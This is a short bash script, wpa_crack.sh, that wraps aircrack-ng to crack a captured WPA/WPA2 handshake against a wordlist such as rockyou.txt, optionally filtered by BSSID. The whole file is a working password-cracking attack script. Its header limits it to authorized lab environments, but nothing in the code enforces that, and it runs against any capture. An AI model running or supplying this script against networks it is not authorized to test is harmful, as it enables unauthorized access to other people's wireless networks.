#!/usr/bin/env bash
# wpa_crack.sh
# Last Edited by Charles Duoto on November 16, 2026
# Crack a WPA/WPA2 handshake with aircrack-ng and a wordlist.
# Pure bash. Authorized lab environments only.
#
# Usage:
#   ./wpa_crack.sh <capture.cap> <wordlist>
#   ./wpa_crack.sh <capture.cap> <wordlist> <bssid>
#
# Examples:
#   ./wpa_crack.sh capture_001122334455-01.cap wordlist.txt
#   ./wpa_crack.sh handshake.cap rockyou.txt 60:C3:97:F6:3E:BA

set -euo pipefail

if [[ $# -lt 2 || $# -gt 3 ]]; then
    echo "Usage: $0 <capture.cap> <wordlist> [bssid]"
    echo "Example: $0 capture.cap wordlist.txt"
    echo "Example: $0 capture.cap wordlist.txt 60:C3:97:F6:3E:BA"
    exit 1
fi

CAP="$1"
WORDLIST="$2"
BSSID="${3:-}"

if [[ ! -f "$CAP" ]]; then
    echo "[-] Capture file not found: $CAP"
    exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
    echo "[-] Wordlist not found: $WORDLIST"
    exit 1
fi

echo "[*] Cracking WPA handshake"
echo "[*] Capture : $CAP"
echo "[*] Wordlist: $WORDLIST"
if [[ -n "$BSSID" ]]; then
    echo "[*] BSSID   : $BSSID"
    aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP"
else
    aircrack-ng -w "$WORDLIST" "$CAP"
fi

echo "[+] Done."
